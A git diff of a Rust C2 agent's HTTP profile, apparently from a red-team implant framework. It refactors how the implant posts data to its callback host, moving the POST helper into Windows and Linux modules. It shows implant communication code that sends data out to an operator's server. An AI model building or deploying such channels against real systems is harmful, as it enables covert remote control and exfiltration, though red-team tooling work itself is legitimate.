@@ -1,5 +1,18 @@
-use crate::{crypto::base64, profiles::C2Profile};
+use super::C2Profile;
+use crate::crypto::base64;
 use std::error::Error;
+
+#[cfg(target_os = "windows")]
+mod windows;
+
+#[cfg(target_os = "windows")]
+use windows::http_post;
+
+#[cfg(target_os = "linux")]
+mod linux;
+
+#[cfg(target_os = "linux")]
+use linux::http_post;
 
 /// Struct holding information for the HTTP profile
 pub struct HTTPProfile {
@@ -26,13 +39,9 @@ impl C2Profile for HTTPProfile {
     fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
         // Send an HTTP post request with the data
         http_post(
-            format!(
-                "{}:{}/{}",
-                self.callback_host,
-                profilevars::cb_port(),
-                profilevars::post_uri()
-            )
-            .as_str(),
+            &self.callback_host,
+            profilevars::cb_port().parse()?,
+            &profilevars::post_uri(),
             data,
         )
     }
@@ -46,37 +55,6 @@ impl C2Profile for HTTPProfile {
     fn set_aes_key(&mut self, new_key: Vec<u8>) {
         self.aes_key = Some(new_key);
     }
-}
-
-/// Generic http POST wrapper returning the body of the result
-/// * `url` - URL for the post request
-/// * `body` - Body of the post request
-fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
-    // Create a new post request with the configured user agent
-    let mut req = minreq::post(url)
-        .with_header("User-Agent", profilevars::useragent())
-        .with_body(body);
-
-    // Add any additional headers
-    if let Some(headers) = profilevars::headers() {
-        for (key, val) in headers.iter() {
-            req = req.with_header(key, val);
-        }
-    }
-
-    // Send the post request
-    let res = req.send()?;
-
-    // Check the status code
-    if res.status_code != 200 {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::ConnectionRefused,
-            "Failed to make post request",
-        )
-        .into());
-    }
-
-    Ok(res.as_str()?.to_string())
 }
 
 /// Configuration variables specific to the HTTP C2 profile
